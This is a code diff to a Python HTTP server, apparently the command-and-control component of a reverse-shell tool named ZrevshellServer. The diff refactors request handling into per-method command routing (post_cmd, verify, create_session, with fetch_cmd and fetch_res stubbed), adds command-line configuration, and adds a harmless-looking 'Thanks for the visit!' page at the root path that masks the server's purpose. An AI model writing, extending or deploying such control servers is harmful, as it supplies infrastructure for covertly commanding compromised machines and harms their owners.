@@ -4,11 +4,12 @@
 import sys
 import reverse_shell.utils as ut
 import json as js
+from typing import Callable, Any
+from reverse_shell.server.config import Config, get_argument_parser
 from http.server import BaseHTTPRequestHandler, HTTPServer
-from http import HTTPStatus
+from http import HTTPStatus, HTTPMethod
 from functools import partial
 from binascii import Error as b64decodeError
-from config import Config
 
 
 class ZrevshellServer(BaseHTTPRequestHandler):
@@ -19,10 +20,14 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         self.config = config
 
         # Defining the server_command-function relation using a dict
-        self.server_command_functions = {
-            "post_cmd": self.handle_cmd_post_cmd,
-            "verify": self.handle_cmd_verify,
-            "create_session": self.handle_cmd_create_session,
+        self.server_command_functions: dict[
+            str, list[HTTPMethod | Callable[..., Any]]
+        ] = {
+            "post_cmd": [self.handle_cmd_post_cmd, HTTPMethod.POST],
+            "verify": [self.handle_cmd_verify, HTTPMethod.POST],
+            "create_session": [self.handle_cmd_create_session, HTTPMethod.POST],
+            "fetch_cmd": [lambda: (False, HTTPStatus.NOT_IMPLEMENTED), HTTPMethod.GET],
+            "fetch_res": [lambda: (False, HTTPStatus.NOT_IMPLEMENTED), HTTPMethod.GET],
         }
 
         # Initializing our parent, cuz of respect.
@@ -57,7 +62,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
                 # Remove the Basic string from the token
                 auth_token = auth_token.removeprefix("Basic").strip()
                 decoded_token = ut.decode_token(auth_token)
-            except b64decodeError:
+            except (b64decodeError, UnicodeDecodeError):
                 pass
             else:
                 if decoded_token == self.config.auth_token:
@@ -354,12 +359,8 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
     # ---------- HTTP request method handler methods ---------- #
 
-    def do_GET(self):
-        """Handle the GET requests."""
-        pass
-
-    def do_POST(self):
-        """Handle POST requests."""
+    def main_handler(self, method: HTTPMethod):
+        """Handle requests."""
 
         # Check if the request is valid
         if not self.check_verified_request():
@@ -367,6 +368,31 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         # Get the client id
         client_id = self.headers.get("client-id").__str__()
+
+        # This is for when accessing the root path. simply send
+        # an OK code with a simple html file.
+        if self.path == "/":
+            data = """
+            <!DOCTYPE html>
+            <html lang="en">
+            <head>
+                <meta charset="UTF-8" />
+                <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+                <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+                <title>Thank You</title>
+            </head>
+            <body>
+                <h2>Thanks for the visit!</h2>
+            </body>
+            </html>
+            """.encode()
+
+            self.send_response(HTTPStatus.OK)
+            self.send_header("content-type", "text/html")
+            self.send_header("content-length", f"{len(data)}")
+            self.end_headers()
+            self.wfile.write(data)
+            return
 
         # the self.path is the command's id in this case
         command = self.config.server_cmds.get(self.path, None)
@@ -376,20 +402,34 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             self.c_send_error(HTTPStatus.NOT_FOUND)
             return
 
+        # Now let's check if the path(command) requested is available in this method
+        handler, req_method = self.server_command_functions[command]
+
+        if req_method != method:
+            # If this path(command) is not meant for this particular
+            # method, then send a 404
+            self.c_send_error(HTTPStatus.NOT_FOUND)
+            return
+
         # ---- Command execution & authorization
         self.execute_command(
             client_id,
             command,
-            self.server_command_functions[command],
+            handler,
             client_type_from_headers=(True if command == "verify" else False),
         )
 
+    def do_GET(self):
+        """Handle the GET requests."""
+        self.main_handler(HTTPMethod.GET)
 
-def start_server():
+    def do_POST(self):
+        """Handle POST requests."""
+        self.main_handler(HTTPMethod.POST)
+
+
+def start_server(configuration: Config):
     """Start the HTTP server"""
-
-    # Initializing our configuration
-    configuration = Config()
 
     # Getting the ip and port from the config
     ip, port = configuration.ip, configuration.port
@@ -459,7 +499,12 @@ def start_server():
 
 def main():
     """Run the reverse shell server"""
-    start_server()
+    # Initializing our configuration
+    parser = get_argument_parser()
+    configuration = Config(parser.parse_args())
+
+    # Let's rockin roll
+    start_server(configuration)
 
 
 if __name__ == "__main__":
